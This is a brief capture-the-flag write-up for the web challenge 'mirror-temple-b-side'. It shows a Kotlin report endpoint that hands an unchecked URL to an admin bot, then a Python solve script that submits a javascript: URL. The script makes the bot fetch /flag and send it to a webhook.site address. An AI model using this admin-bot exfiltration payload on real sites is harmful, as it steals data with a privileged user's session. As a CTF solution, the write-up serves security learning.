# web - mirror-temple-b-side

```
    @PostMapping("/report", produces = [MediaType.TEXT_PLAIN_VALUE])
    @ResponseBody
    fun report(@RequestParam("url") url: String): String {
        runCatching {
            ProcessBuilder("node", "admin.mjs", url)
                .inheritIO()
                .start()
        }
        return "your report will be scrutinized soon"
    }
```

^ no check for javascript: or enforcement of https:// http://, so i thought it would work

```
import time
import requests

TARGET = "https://mirror-temple-b-side-20d043ae57e5.ctfi.ng"
WEBHOOK = "https://webhook.site/a15e2101-84b3-4b29-9667-54f03041ad7f"

session = requests.Session()

postcard_url = TARGET + "/postcard-from-nyc"
report_url = TARGET + "/report"
payload = f"""javascript:fetch('/flag')
.then(r => r.text())
.then(f => location = '{WEBHOOK}?f=' + encodeURIComponent(f))"""

print("making save...")
body = {
    "name": "solver",
    "flag": "dice{tmp}",
}
session.post(postcard_url, data=body, timeout=15)

print("sending report...")
body = {"url": payload}
print(session.post(report_url, data=body, timeout=15).text.strip())

print("check webhook")
```

Compiled by: yappare
Solved by: vicevirus